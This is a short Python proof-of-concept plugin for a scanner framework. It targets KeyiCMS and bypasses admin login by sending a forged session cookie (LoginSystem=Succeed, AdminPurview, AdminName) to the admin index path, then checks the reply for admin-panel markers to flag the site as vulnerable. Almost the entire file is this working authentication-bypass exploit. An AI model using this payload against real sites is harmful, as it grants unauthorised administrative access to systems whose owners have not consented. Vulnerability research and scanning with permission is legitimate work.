#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

from module.plugin import Plugin

class poc(Plugin):
    
    type = 'CMS'
    cmsname = 'keyicms'
    querytype = 'site'
    description = 'KeyiCMS login in by Cookie whithout auth'    

    def __init__(self):
    
        self.payload = "ASPSESSIONIDSATDDSRR=LBIFPODBGDIKCHLMLINLNCGO; \
                CompanyZY=LoginIP=192%2E168%2E90%2E1&AdminLoginCode=keyicms&LoginSystem=Succeed&AdminPurview=123&AdminName=123"
        self.path = '/Keyicms_System/Keyicms_Index.Asp?AdminAction=login'
    
    def exploit(self, target):
        
        response = self.query(method='GET', url=target+self.path, cookie=self.payload)
        if response:
            if response.ok:
                if 'location.replace(\'Keyicms_Login.Asp\')' in response.content and 'href="Ky_Admin.Asp"' in response.content:
                    self.log.vuln(target)    
